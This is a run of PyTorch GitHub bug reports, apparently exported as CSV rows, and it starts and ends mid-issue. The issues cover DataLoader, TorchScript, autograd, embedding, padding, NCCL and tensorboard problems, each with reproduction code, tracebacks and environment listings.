def test(output_padding):
    network = Test(output_padding=output_padding).cuda()
    x = torch.rand((1028, 128, 6, 6)).cuda()


    for i in range(5):
        start = time.time()
        for i in range(10):
            network(x)
        print((time.time() - start) / 10)

test((0, 0))
test((1, 1))
```

On my V100 machine, I get timings of about 0.0004s per forward pass with `output_padding=(0, 0)` and about .05s with `output_padding=(1, 1)`.

## Expected behavior

Given that the `output_padding` option has minimal effect on the number of FLOPs required to compute the function, I would expect the computation time to be similar with and without the option.



## Environment

PyTorch version: 1.3.1
Is debug build: No
CUDA used to build PyTorch: 10.1.243

OS: Ubuntu 16.04.6 LTS
GCC version: Could not collect
CMake version: Could not collect

Python version: 3.6
Is CUDA available: Yes
CUDA runtime version: 10.0.130
GPU models and configuration: GPU 0: Tesla V100-SXM2-16GB
Nvidia driver version: 418.87.00
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.2

Versions of relevant libraries:
[pip3] numpy==1.17.4
[pip3] torch==1.3.1
[pip3] torchcule==0.1.0
[pip3] torchvision==0.4.1
[conda] Could not collect


cc @csarofeen @ptrblck",True
DataLoader fails to re-raise exceptions with required arguments module: dataloader triaged,"## üêõ Bug
`torch.utils.data.DataLoader` attempts to relay exceptions from its child processes.  It fails to do this when the exception type takes multiple required arguments.

## To Reproduce

Run this:
```
import torch.utils.data
class E(Exception):
    def __init__(self, a, b):
        pass
    def __str__(self):
        return ""Special exception message""

class G(torch.utils.data.IterableDataset):
    def __iter__(self):
        raise E(a=1, b=2)
        yield 1
    
d = torch.utils.data.DataLoader(G(), num_workers=1)
next(iter(d))
```

The result:
```
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""/usr/local/miniconda3/envs/openai/lib/python3.7/site-packages/torch/utils/data/dataloader.py"", line 819, in __next__
    return self._process_data(data)
  File ""/usr/local/miniconda3/envs/openai/lib/python3.7/site-packages/torch/utils/data/dataloader.py"", line 846, in _process_data
    data.reraise()
  File ""/usr/local/miniconda3/envs/openai/lib/python3.7/site-packages/torch/_utils.py"", line 369, in reraise
    raise self.exc_type(msg)
TypeError: __init__() missing 1 required positional argument: 'b'
```

## Expected behavior

Should see the `E: Special exception message` printed. (This works when `num_workers=0`.)

## Environment
 - PyTorch Version (e.g., 1.0): 1.3.1
 - OS (e.g., Linux): Linux

cc @SsnL",True
[TensorBoard] add_hparams outputs undesired figures triaged module: tensorboard,"## üêõ Bug

The method `add_hparams` in tensorboard is amazing, however, sometimes it generates strange figures like the following figure:

<img width=""1439"" alt=""Êà™Âúñ 2019-11-16 ‰∏äÂçà12 30 21"" src=""https://user-images.githubusercontent.com/33038038/68959176-8574b400-0808-11ea-9dcc-86c886f24bbf.png"">

The second figure in the bottom row shows that there are some gaps in loss and accuracy when the x-axis is batch_size, which is unexpected. It should look like the one showing accuracy v.s. lr.

BTW, the labels of the x-axis are hard to see if they are too close to each other. It is better to show them vertically.

## To Reproduce

Steps to reproduce the behavior:

```
from torch.utils.tensorboard import SummaryWriter

with SummaryWriter() as w:
    for i in range(20):
        w.add_hparams(hparam_dict={'lr': 0.1 * i, 'batch_siz': 10 * i},
                      metric_dict={'hparam/accuracy': 0.9 ** i, 'hparam/loss': 0.01 * i})
    
writer.close()
```",True
cuSPARSE handle is not thread-safe module: cuda triaged,"From what I observe when working on https://github.com/pytorch/pytorch/pull/29233, cusparse handle is managed the same way as cublas handle, therefore not thread-safe.

https://github.com/pytorch/pytorch/pull/29233 makes the handle pool mechanism which was originally used for cudnn generic, so it would also be able to use to manage cusparse handle. We should migrate the management of cusparse handle to that approach.

See also: https://github.com/pytorch/pytorch/issues/6962

cc: @mcarilli @ngimel @mruberry ",True
TorchScript does not preserve string behavior for string with unicode characters oncall: jit triaged jit-backlog,"## üêõ Bug

If a function calls `len(s)`, it works differently in scripted and eager modes.

## To Reproduce

Test:
```
import torch
string = ""Norman√∞y""
print(string)

def foo(s: str):
    return len(s)

foo_scripted = torch.jit.script(foo)

print(foo(string))
print(foo_scripted(string))
```

Output:
```
Norman√∞y
8
9
```

cc @suo",True
[jit][script] torch.jit.script does not support nn.RNN oncall: jit triaged,"## üêõ Bug

`torch.jit.script` does not seem to support `nn.RNN`

## To Reproduce

Running

```python
import torch
import torch.nn as nn

torch.jit.script(nn.RNN(32, 64, 1))
```

fails with

```
Traceback (most recent call last):
  File ""test.py"", line 4, in <module>
    torch.jit.script(nn.RNN(32, 64, 1))
  File ""/opt/anaconda/envs/test/lib/python3.6/site-packages/torch/jit/__init__.py"", line 1203, in script
    return torch.jit.torch.jit._recursive.recursive_script(obj)
  File ""/opt/anaconda/envs/test/lib/python3.6/site-packages/torch/jit/_recursive.py"", line 173, in recursive_script
    return copy_to_script_module(mod, overload_stubs + stubs)
  File ""/opt/anaconda/envs/test/lib/python3.6/site-packages/torch/jit/_recursive.py"", line 95, in copy_to_script_module
    torch.jit._create_methods_from_stubs(script_module, stubs)
  File ""/opt/anaconda/envs/test/lib/python3.6/site-packages/torch/jit/__init__.py"", line 1423, in _create_methods_from_stubs
    self._c._create_methods(self, defs, rcbs, defaults)
RuntimeError: 
Tensor cannot be used as a tuple:
at /opt/anaconda/envs/test/lib/python3.6/site-packages/torch/nn/modules/rnn.py:184:67
    def forward(self, input, hx=None):
        is_packed = isinstance(input, PackedSequence)
        if is_packed:
            input, batch_sizes, sorted_indices, unsorted_indices = input
                                                                   ~~~~~ <--- HERE
            max_batch_size = batch_sizes[0]
            max_batch_size = int(max_batch_size)
        else:
            batch_sizes = None
            max_batch_size = input.size(0) if self.batch_first else input.size(1)
            sorted_indices = None
            unsorted_indices = None

        if hx is None:
```

## Expected behavior

That you can successfully jit `nn.RNN` like you can with `nn.LSTM` and `nn.GRU`.

## Environment

Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```PyTorch version: 1.3.0
Is debug build: No
CUDA used to build PyTorch: None

OS: Ubuntu 18.04.3 LTS
GCC version: (Ubuntu 8.3.0-6ubuntu1~18.04.1) 8.3.0
CMake version: Could not collect

Python version: 3.6
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip] numpy==1.17.2
[pip] torch==1.3.0
[conda] cpuonly                   1.0                           0    pytorch
[conda] mkl                       2019.4                      243  
[conda] pytorch                   1.3.0               py3.6_cpu_0  [cpuonly]  pytorch
```

cc @suo",True
The affinity of a worker process is reset after torch.randperm is called high priority module: dataloader triaged module: random,"## üêõ Bug

The affinity of a worker process is reset after `torch.randperm` is called in the worker process.

## To Reproduce

Steps to reproduce the behavior:

1. Change the worker process affinity in the `worker_init_fn` function.
1. Call `torch.randperm` in the `__iter__` method of an IterableDataser.
1. Now the worker process affinity is back to the original one.

The following code sample reproduce the problem :

```
import os
import torch
import torch.utils.data

class TestDataset(torch.utils.data.IterableDataset):
    
    def __iter__(self):
        assert(len(os.sched_getaffinity(0)) == 1)
        torch.randperm(1)
        assert(len(os.sched_getaffinity(0)) == 1)
        return range(1)

def worker_init_fn(_):
    os.sched_setaffinity(0, list(os.sched_getaffinity(0))[0:1])
        
if __name__ == '__main__':
    assert(len(os.sched_getaffinity(0)) > 1)
    dataset = TestDataset()
    dataloader = torch.utils.data.DataLoader(dataset, num_workers=1, worker_init_fn=worker_init_fn)
    for _ in dataloader:
        pass
```

## Expected behavior

I except that a call to `torch.randperm` inside a worker process doesn't touch the process affinity.

## Environment

I use the Docker image `pytorch/pytorch:1.3-cuda10.1-cudnn7-runtime`.

```
Collecting environment information...
PyTorch version: 1.3.0
Is debug build: No
CUDA used to build PyTorch: 10.1.243

OS: Ubuntu 16.04.6 LTS
GCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
CMake version: Could not collect

Python version: 3.6
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip] numpy==1.17.2
[pip] torch==1.3.0
[pip] torchvision==0.4.1a0+d94043a
[conda] blas                      1.0                         mkl  
[conda] mkl                       2019.4                      243  
[conda] mkl-service               2.3.0            py36he904b0f_0  
[conda] mkl_fft                   1.0.14           py36ha843d7b_0  
[conda] mkl_random                1.1.0            py36hd6b4f25_0  
[conda] pytorch                   1.3.0           py3.6_cuda10.1.243_cudnn7.6.3_0    pytorch
[conda] torchvision               0.4.1                py36_cu101    pytorch
```


cc @ezyang @gchanan @zou3519 @jerryzh168 @SsnL",True
IterableDataset should be added into dataset.pyi module: dataloader module: typing triaged,"## üêõ Bug
trying to import `IterableDataset` in `torch.utils.data.dataset` creates an error in PyCharm. look at the following picture:
![ÂõæÁâá](https://user-images.githubusercontent.com/44257865/66712058-9c6b5500-edc9-11e9-9492-64c416939e7b.png)

It says that `cannot find reference in dataset.pyi`, where in `dataset.pyi`, we can see that:
![ÂõæÁâá](https://user-images.githubusercontent.com/44257865/66712088-f9670b00-edc9-11e9-9ad4-417bc791c207.png)

It's obviously that there is no `IterableDataset` but only its super class `Dataset` exists.
I believe it should be added.


## To Reproduce
Steps to reproduce the behavior:

1. Open PyCharm
2. Write `from torch.utils.data.dataset import IterableDataset`
3. Error

## Expected behavior

No unresolved reference hinted.

## Environment
```
PyTorch version: 1.2.0
Is debug build: No
CUDA used to build PyTorch: Could not collect

OS: Arch Linux
GCC version: (GCC) 9.2.0
CMake version: version 3.15.4

Python version: 3.7
Is CUDA available: No
CUDA runtime version: 10.1.243
GPU models and configuration: GPU 0: GeForce RTX 2060
Nvidia driver version: 435.21
cuDNN version: /usr/lib/libcudnn.so.7.6.4

Versions of relevant libraries:
[pip3] numpy==1.17.2
[pip3] torch==1.2.0
[pip3] torchvision==0.4.0a0
[conda] Could not collect
```

## Additional context


cc @SsnL @ezyang",True
nn.Embedding with max_norm shows unstable behavior and causes sometimes runtime error. high priority module: nn triaged,"## üêõ Bug

An `nn.Embedding` object with `max_norm` set to `True` causes a RuntimeError that is hard to track.

## To Reproduce
The following code causes a RuntimeError. The error can be avoided by **removing the max_norm** feature or by **swapping Line a and Line b** in the code.
```
import torch
import torch.nn as nn

n, d, m = 3, 5, 7
batch_size = 11

embedding = nn.Embedding(n, d, max_norm=True)
W = torch.randn((m, d), requires_grad=True)
optimizer = torch.optim.Adam(list(embedding.parameters()) + [W], lr=1e-3)

optimizer.zero_grad()
idx = torch.tensor([1, 2])

a = embedding.weight @ W.t()  # Line a 
b = embedding(idx) @ W.t()    # Line b

out = (a.unsqueeze(0) + b.unsqueeze(1))
loss = out.sigmoid().prod()
loss.backward()
optimizer.step()
```

```
---------------------------------------------------------------------------
RuntimeError                              Traceback (most recent call last)
<ipython-input-472-103ef18503d8> in <module>
     17 out = (a.unsqueeze(0) + b.unsqueeze(1))
     18 loss = out.sigmoid().prod()
---> 19 loss.backward()
     20 optimizer.step()

~/miniconda3/envs/kg/lib/python3.7/site-packages/torch/tensor.py in backward(self, gradient, retain_graph, create_graph)
    116                 products. Defaults to ``False``.
    117         """"""
--> 118         torch.autograd.backward(self, gradient, retain_graph, create_graph)
    119 
    120     def register_hook(self, hook):

~/miniconda3/envs/kg/lib/python3.7/site-packages/torch/autograd/__init__.py in backward(tensors, grad_tensors, retain_graph, create_graph, grad_variables)
     91     Variable._execution_engine.run_backward(
     92         tensors, grad_tensors, retain_graph, create_graph,
---> 93         allow_unreachable=True)  # allow_unreachable flag
     94 
     95 

RuntimeError: one of the variables needed for gradient computation has been modified by an inplace operation: [torch.FloatTensor [3, 5]] is at version 2; expected version 1 instead. Hint: enable anomaly detection to find the operation that failed to compute its gradient, with torch.autograd.set_detect_anomaly(True).
```

## Expected behavior
There shouldn't be any error when running the code above.
Strangely, there is no RuntimeError when **Line a** and **Line b** are swapped. This is something that has to be investigated.

## Environment

PyTorch version: 1.2.0
Is debug build: No
CUDA used to build PyTorch: 10.0.130

OS: Ubuntu 18.04.3 LTS
GCC version: (Homebrew gcc 5.5.0_4) 5.5.0
CMake version: Could not collect

Python version: 3.7
Is CUDA available: Yes
CUDA runtime version: 10.1.243
GPU models and configuration: GPU 0: GeForce GTX 1080 Ti
Nvidia driver version: 430.26
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.3

Versions of relevant libraries:
[pip] botorch==0.1.3
[pip] gpytorch==0.3.5
[pip] numpy==1.17.2
[pip] torch==1.2.0
[pip] torchvision==0.4.0a0+6b959ee
[conda] blas                      1.0                         mkl
[conda] botorch                   0.1.3                    pypi_0    pypi
[conda] gpytorch                  0.3.5                    pypi_0    pypi
[conda] libblas                   3.8.0                    12_mkl    conda-forge
[conda] libcblas                  3.8.0                    12_mkl    conda-forge
[conda] liblapack                 3.8.0                    12_mkl    conda-forge
[conda] mkl                       2019.4                      243
[conda] pytorch                   1.2.0           py3.7_cuda10.0.130_cudnn7.6.2_0    pytorch
[conda] torchvision               0.4.0                py37_cu100    pytorch

## Additional context

<!-- Add any other context about the problem here. -->


cc @ezyang @gchanan @zou3519 @jlin27 @albanD @mruberry",True
torch.Tensor reverse operators (__rmul__) should return NotImplemented for unsupported types high priority feature triaged enhancement,"Currently if the the argument of `__rmatmul__` is not a Tensor, PyTorch throws `*** TypeError: matmul(): argument 'other' (position 1) must be Tensor, not Vec`

Python data model asks that it return `NotImplemented` in such case. This allows interpreter to dispatch op to the proper implementation.
(ie see https://docs.python.org/3/library/numbers.html#implementing-the-arithmetic-operations)

Current behavior makes it hard to implement custom types. IE
```
class FactoredMatrix:
  def __init__(self, mat):
    self.mat = mat
  def __matmul__(self, other):
    return 0
  def __rmatmul__(self, other):
    return 1
x = torch.ones((2,2))
print(FactoredMatrix(x) @ x)  # works
print(x @ FactoredMatrix(x))  # fails
```


cc @ezyang @gchanan @zou3519",True
"When CUDA is enabled, recompiling after editing aten/src/ATen/core/dispatch/DispatchTable.h doesn't result in all necessary files getting recompiled high priority module: build triaged internals","Other files may also be susceptible, but the issue reproduces 100% on `aten/src/ATen/core/dispatch/DispatchTable.h`

Steps to reproduce:
1. Build PyTorch `python setup.py develop`
2. Edit the ""Didn't find kernel to dispatch to"" error message to insert some string. Example diff:

```
diff --git a/aten/src/ATen/core/dispatch/DispatchTable.h b/aten/src/ATen/core/dispatch/DispatchTable.h
index 7b4af315f1..3a5879cbda 100644
--- a/aten/src/ATen/core/dispatch/DispatchTable.h
+++ b/aten/src/ATen/core/dispatch/DispatchTable.h
@@ -263,7 +263,7 @@ private:
       }
 
       const std::string dispatch_key_str = dispatch_key.has_value() ? toString(*dispatch_key) : ""None"";
-      TORCH_CHECK(false, ""Didn't find kernel to dispatch to for operator '"", operator_name_,
+      TORCH_CHECK(false, ""ARGLEBARGLEFARR Didn't find kernel to dispatch to for operator '"", operator_name_,
                ""'. Tried to look up kernel for dispatch key '"", dispatch_key_str,
                ""'. Registered dispatch keys are: "", listAllDispatchKeys());
   }
```

3. Rebuild PyTorch `python setup.py develop`
4. Run `python -c ""import torch; torch.cat([], dim=1)`

Expected result: you see ARGLEBARGLEFARR
Actual result: you don't see it

I did an experiment where I did one of these botched recompiles, and then compared the set of files which had ARGLEBARGLEFARR with the set of files that had the normal error message. What I found is that CUDA generated files had not been recompiled, but CPU (and final library) all had the string. The fact that the CUDA files are not recompiling seems problematic; however, I don't understand how this could have caused the problem, as the test I made above is CPU (perhaps some sort of weak symbol situation?)

cc @ezyang @gchanan @zou3519 @smessmer ",True
Gradient for embedding vector at padding_idx is not zero when on GPU high priority module: autograd triaged,"## üêõ Bug
Backward passes generate nonzero gradients for the embedding vector at the `padding_idx` index. Only occurs on the GPU, and didn't occur as of version 1.0.1.post2. 

## To Reproduce

```
import torch
dev = torch.device('cuda')
torch.manual_seed(0)

random_ix = torch.randint(high=10, size=(256, 3, 7))
embedding_layer = torch.nn.Embedding(10, 5, padding_idx=0)

embedding_layer.to(dev)
random_ix = random_ix.to(dev)

embeds = embedding_layer(random_ix)
merged = torch.sum(embeds, dim=2)
summed = merged.sum()
summed.backward()

print(embedding_layer.weight.grad[0])
```
which outputs: `tensor([505., 505., 505., 505., 505.], device='cuda:0')`

## Expected behavior
`tensor([0., 0., 0., 0., 0.], device='cuda:0')`

Running on the CPU provides the expected behavior:

```
torch.manual_seed(0)

random_ix = torch.randint(high=10, size=(256, 3, 7))
embedding_layer = torch.nn.Embedding(10, 5, padding_idx=0)

embeds = embedding_layer(random_ix)
merged = torch.sum(embeds, dim=2)
summed = merged.sum()
summed.backward()

print(embedding_layer.weight.grad[0])
```

## Environment

 - PyTorch Version: 1.2
 - OS: Ubuntu 18.04.2 LTS
 - How you installed PyTorch: pipenv
 - Python version: 3.6.7
 - CUDA/cuDNN version: 10.0
 - GPU models and configuration: GeForce RTX 2080 Ti


cc @ezyang @gchanan @zou3519 @SsnL @albanD @gqchen",True
Torch.nonzero() leads to crash in PyTorch 1.2 high priority module: autograd triaged,"The code snippet works fine in 1.1 but causes an error in 1.2:
> p = F.softmax(x, dim=1)
> m = y != self.ignore_index
> t = F.one_hot((y * m.byte()).long(), num_classes=self.num_classes).byte().permute(0,3,1,2)
> i = (p * (t * m.unsqueeze(1).byte()).float()).sum((0,2,3))
> u = ((p + t.float()) * m.unsqueeze(1).float()).sum((0,2,3)) - i
> v = u.nonzero()
> return -((i[v] / u[v]).mean()).log()

I get the error message below:

> RuntimeError: range.second - range.first == t.size() INTERNAL ASSERT FAILED at /pytorch/torch/csrc/autograd/generated/Functions.cpp:55, please report a bug to PyTorch. inconsistent range for TensorList output

I had to remove the usage of nonzero() like below to make the code work:
> p = F.softmax(x, dim=1)
> m = y != self.ignore_index
> t = F.one_hot((y * m.byte()).long(), num_classes=self.num_classes).byte().permute(0,3,1,2)
> i = (p * (t * m.unsqueeze(1).byte()).float()).sum((0,2,3))
> u = ((p + t.float()) * m.unsqueeze(1).float()).sum((0,2,3)) - i
> return -((i / u).mean()).log() 

I have two questions:
(1) Why does the runtime error happen in 1.2 but not in 1.1?
(2) By not using nonzero to prevent division by zero I have numeric instability in theory. However, in really the number that comes out from a softmax operation should not reach zero because the input can't really reach negative infinity right?

cc @ezyang @gchanan @zou3519 @SsnL @albanD",True
Very high CPU utilization with pin_memory=True and num_workers > 0 module: dataloader module: cpu triaged module: multithreading,"## üêõ Bug
There seems to be an issue with CPU utilization when using a DataLoader with pin_memory=True and num_workers > 0. 

I revisited some old code that had `pin_memory=True` and two workers that weren't doing all that much. It pinned all of my CPU cores at or near 100%, with 40-50% of the usage in the kernel.  I've had performance issues with pinned memory in the past, but never to this level. Indeed, I cannot reproduce the issue going back to some older environments with 0.4 or 1.0.1. But on 3 machines w/ PyTorch 1.1 and 1.2 I can easily reproduce by running the MNIST main.py from the current examples master.

If I set either num_workers=0 or pin_memory=False the issue goes away and I'm left with the expected one core and change of usage for MNIST (or two cores and change for my original case). 

## To Reproduce

1. Run `main.py` from the MNIST example on master pytorch/examples repository.

## Expected behavior

For MNIST, with 1 worker I expect roughly 1 core's worth of CPU utilization plus some overhead. It consumes 50-100% of all cores on systems with 8-14 physical (16-28 logical) cores. A large % of the CPU usage is in the kernel, appears to be spinning/yielding, possibly due to contention. 

## Environment

I've reproduced on 3 machines.

 - PyTorch Version (e.g., 1.0): 1.1 and 1.2 (no issue on an older 1.0.1 and 0.4.1 environment on one of the machines)
 - OS (e.g., Linux): two Ubuntu 18.04 machines, one Ubuntu 16.04 machine
 - How you installed PyTorch (`conda`, `pip`, source): All conda installs
 - Python version: 3.7.3 and 3.6.8
 - CUDA/cuDNN version: Cuda 10 and CUDNN 7.5.1 and 7.6.2
 - GPU models and configuration: dual Titan RTX one one machine, dual Titan Xp and 1080Ti on other two
 - Any other relevant information:

## Additional context
I've seen at least one very likely, and other potential threads in discussion forum that are likely this issue. 

This one has an htop screenshot from me, and another user:
https://discuss.pytorch.org/t/cpu-usage-extremely-high/52172/5



cc @SsnL",True
Pylint Error `torch.tensor is not callable` high priority module: internals module: typing triaged small,"## üêõ Bug

Pylint returns the error `torch.tensor is not callable`

## To Reproduce

Steps to reproduce the behavior:

```python
import torch

if __name__ == ""__main__"":
    t = torch.tensor([1, 2, 3], dtype=torch.float64)
```

```
>>> pipenv run pylint test.py
test.py:4:8: E1102: torch.tensor is not callable (not-callable)
```

## Expected behavior

This shall not raise pylint error

## Environment

```
PyTorch version: 1.2.0
Is debug build: No
CUDA used to build PyTorch: 10.0.130

OS: Ubuntu 18.04.2 LTS
GCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
CMake version: version 3.10.2

Python version: 3.7
Is CUDA available: Yes
CUDA runtime version: 10.0.130
GPU models and configuration:
GPU 0: GeForce RTX 2080 Ti
GPU 1: GeForce RTX 2080 Ti

Nvidia driver version: 418.67
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.1

Versions of relevant libraries:
[pip3] numpy==1.17.0
[pip3] torch==1.2.0
[conda] Could not collect

Pytorch installed in Pipenv Environment
pylint==2.3.1
```

## Additional context

None

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @bhosmer @smessmer @ljk53 @ailzhang @malfet @rgommers @xuzhao9 @gramster",True
[FR] More consistent matrix norm for torch.norm high priority module: bc-breaking triaged module: numpy module: linear algebra,"`torch.norm` currently have the following inconsistent behavior where for matrix inputs and `ord` is a numerical value, **vector** norm is computed instead:
```
            =====  ============================  ==========================
            ord    matrix norm                   vector norm
            =====  ============================  ==========================
            None   Frobenius norm                2-norm
            'fro'  Frobenius norm                --
            'nuc'  nuclear norm                  --
            Other  as vec norm when dim is None  sum(abs(x)**ord)**(1./ord)
            =====  ============================  ==========================
```
(Even though the last row reads `when dim is None`, same behavior happens when `dim` is a 2-tuple).


However, the matrix Lpq norms are useful. And users are justified in expecting that `mat.norm(2)` computes the L2 norm (max e-value) since `mat.norm('fro')` computes the matrix Frobenius norm. If we follow the [NumPy interface](https://docs.scipy.org/doc/numpy/reference/generated/numpy.linalg.norm.html), the following behavior should be less surprising and error prune:

```

    =====  ============================  ==========================
    ord    norm for matrices             norm for vectors
    =====  ============================  ==========================
    None   Frobenius norm                2-norm
    'fro'  Frobenius norm                --
    'nuc'  nuclear norm                  --
    inf    max(sum(abs(x), axis=1))      max(abs(x))
    -inf   min(sum(abs(x), axis=1))      min(abs(x))
    0      --                            sum(x != 0)
    1      max(sum(abs(x), axis=0))      as below
    -1     min(sum(abs(x), axis=0))      as below
    2      2-norm (largest sing. value)  as below
    -2     smallest singular value       as below
    other  --                            sum(abs(x)**ord)**(1./ord)
    =====  ============================  ==========================
```

cc @ezyang @gchanan @zou3519 @SsnL @vishwakftw @jianyuh",True
Circular padding doesn't work when the 'right' side is 0 module: nn triaged,"Reproduction:
```
import torch
import torch.nn.functional as F

inputs = torch.randn(1, 1, 5, 5)
print(F.pad(inputs, [4,0,3,0], mode='circular').shape) # (1,1,5,5) (Wrong)
print(F.pad(inputs, [1,0,0,0], mode='circular').shape) # (1,1,5,5) (Wrong)
print(F.pad(inputs, [1,1,0,0], mode='circular').shape) # (1,1,5,7) (Correct)
print(F.pad(inputs, [2,1,0,0], mode='circular').shape) # (1,1,5,8) (Correct)
```

Correct results:
```
import torch
import torch.nn.functional as F

inputs = torch.randn(1, 1, 5, 5)
print(F.pad(inputs, [4,0,3,0], mode='circular').shape) # (1,1,8,9)
print(F.pad(inputs, [1,0,0,0], mode='circular').shape) # (1,1,5,6)
print(F.pad(inputs, [1,1,0,0], mode='circular').shape) # (1,1,5,7)
print(F.pad(inputs, [2,1,0,0], mode='circular').shape) # (1,1,5,8)
```



cc @SsnL",True
Memory leak in `torch.tensor` high priority module: internals module: memory usage triaged module: numpy,"## üêõ Bug

Calling `torch.tensor` on a Python `list` of `np.float32` objects leaks memory.

## To Reproduce

```
import numpy as np
import torch

def mem():
	import os, psutil
	return psutil.Process(os.getpid()).memory_info().rss // 1024

a = np.zeros(10000, dtype = np.float32) # <-- 1. dtype is important
a = list(a) # <-- 2. has to be a python list

mem_base = mem()
for _ in range(10):
	torch.tensor(a) # <-- 3. must not pass `dtype=torch.float32` here
	print(mem() - mem_base)

# output on my machine:
# 1416
# 2884
# 3940
# 4996
# 6316
# 7372
# 8428
# 9484
# 10804
# 11860
```

## Expected behavior

The number being printed (memory usage) should be more or less constant.

## Environment

 - PyTorch Version: 1.0.0, 1.1.0, 1.2.0
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): pip
 - Python version: 3.6.8

## Additional context

On pytorch==0.4.1, `torch.tensor(a)` throws:
```
RuntimeError: Could not infer dtype of numpy.float32
```

Also, this might be the underlying bug in [#17499](https://github.com/pytorch/pytorch/issues/17499).

### How this shows up in real code

This shows up in real code if you have a 1d array in a dataset:

```
class Dataset:
    def __init__(self, X, y):
        self.X = x; self.y = y
    
    def __getitem__(self, i):
        return self.X[i], self.y[i] # <-- self.y[i] is a np.float32
    
    def __len__(self):
        return self.X.shape[0]
```

`self.y[i]` is a `np.float32`, and in 1.2.0, a batch of these get wrapped in a `list` by `_MapDatasetFetcher`, and `default_collate` calls `torch.as_tensor` on it.",True
Error caffe2.python when tried importing SummaryWriter from torch.utils.tensorboard triaged module: tensorboard,"## üêõ Bug

I'm currently having a problem whenever I tried importing `SummaryWriter` in my Python script. 

## To Reproduce

I'm currently using the Data Science VM provided by Azure to run the Python. I used clean new env in Anaconda for installing Pytorch and all library dependencies (and also tb-nightly as instructed in [here](https://pytorch.org/docs/stable/tensorboard.html)).

I tried to inspect if my code could use the Tensorboard using simple line of codes like
```
import torch
from torch.utils.tensorboard import SummaryWriter
```
But I got this warning, and then critical message here

![image](https://user-images.githubusercontent.com/12664445/62860613-de750d80-bd2a-11e9-86bf-7c00bfa2add5.png)

## Expected behavior

As far as I know, everything should be good if I followed the instruction correctly. I also tried to reproduce the error in my local Windows PC. But no errors showed up

## Environment
 - PyTorch Version : 1.2.0
 - OS : Linux 16.04
 - How you installed PyTorch : conda
 - Python version: Python 3.6
 - CUDA/cuDNN version : CUDA 10 / cudnn 7.4
 - GPU models and configuration: 2 Tesla K80
 - Any other relevant information: This problem occurs on a VM machine deployed in Azure",True
[distributed] NCCL Backend doesn't support torch.bool data type oncall: distributed triaged enhancement module: boolean tensor,"## üêõ Bug

In version 1.2.0, NCCL backend doesn't support `torch.bool` datatype. Broadcasting a tensor of this type throws error ""RuntimeError: Unsupported data type for NCCL process group"".

## To Reproduce

Steps to reproduce the behavior:

Create a file test.py with following contents:
```py
import torch
import argparse
from torch import distributed as dist


parser = argparse.ArgumentParser()
parser.add_argument(""--local_rank"", type=int)

args = parser.parse_args()

torch.distributed.init_process_group(""nccl"")

local_rank = args.local_rank

device = torch.device(local_rank)

if local_rank == 0:
    element = False
else:
    element = True


def broadcast_scalar(scalar, src=0, device=""cpu""):
    scalar_tensor = torch.tensor(scalar).to(device)
    with torch.no_grad():
        scalar_tensor = dist.broadcast(scalar_tensor, src)
    return scalar_tensor.item()


broadcast_scalar(element, src=0, device=device)
```

Run it with following command:
`python -u -m torch.distributed.launch --nproc_per_node 2 test.py`

This has been tested on 2 GPUs.

## Expected behavior

NCCL backend should support the bool datatype. 
Current workaround fix: Change the datatype to int by doing `.long()` before broadcasting.
## Environment

```
Is debug build: No
CUDA used to build PyTorch: 10.0.130

OS: Ubuntu 18.04.1 LTS
GCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
CMake version: version 3.10.2

Python version: 3.6
Is CUDA available: Yes
CUDA runtime version: 9.0.176
GPU models and configuration:
GPU 0: Quadro GP100
GPU 1: Quadro GP100

Nvidia driver version: 410.79
cuDNN version: Could not collect

Versions of relevant libraries:
[pip] numpy==1.16.3
[pip] torch==1.2.0
[pip] torchtext==0.3.1
[pip] torchvision==0.2.2
[conda] torch                     1.2.0                     <pip>
[conda] torchtext                 0.3.1                     <pip>
[conda] torchvision               0.2.2                     <pip>
```
",True
triu not implemented for Bool high priority triaged module: boolean tensor,"I'm getting the error [title] with the latest nightly build.  I was doing

```python
torch.ones(n, m, dtype=torch.uint8).triu_() 
```
to get an upper-triangular mask, but now I'm getting a deprecation warning about using tensors other than booleans in `torch.masked_scatter`, so I changed the above to

```python
torch.ones(n, m, dtype=torch.bool).triu_()
```
which now fails with `RuntimeError: ""triu"" not implemented for 'Bool'`.  Is this known and/or WIP?",True
torch.Tensor.repeat() fails for 0 repeats good first issue triaged module: numpy,"## üêõ Bug

To enable programming in a generic way, torch.Tensor.repeat() should work for 0 repeats. This is not the case. It works in numpy, it should work in pytorch too.

## To Reproduce

```
>>> import torch
>>> a = torch.ones((2, 2, 2))
>>> a.repeat((2, 0, 2))
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
RuntimeError: invalid argument 3: out of range at ..\aten\src\TH/generic/THTensor.cpp:392
```

## Expected behavior

The repeat call should not crash for the given inputs. It should have the same-shaped result as in numpy:

```
>>> import numpy as np
>>> a = np.ones((2, 2, 2))
>>> np.tile(a, (2, 0, 2))
array([], shape=(4, 0, 4), dtype=float64)
```

## Environment

 - PyTorch Version (e.g., 1.0): 1.1
 - OS (e.g., Linux): Windows 10, Ubuntu 16.04
 - How you installed PyTorch (`conda`, `pip`, source): anaconda (Windows 10), pip3 (Ubuntu 16.04)
 - Build command you used (if compiling from source):
 - Python version: 3.5.2 (Ubuntu 16.04), 3.7.3 (Windows 10)
 - CUDA/cuDNN version: 10.0
 - GPU models and configuration: 2xGTX 1080 Ti (Ubuntu 16.04), GTX 1080 (Windows 10)
",True
[jit] wrong gradient for CUDA tensor oncall: jit triaged,"## üêõ Bug

The following script shows the issue.

## To Reproduce

```
import torch

def f(z):
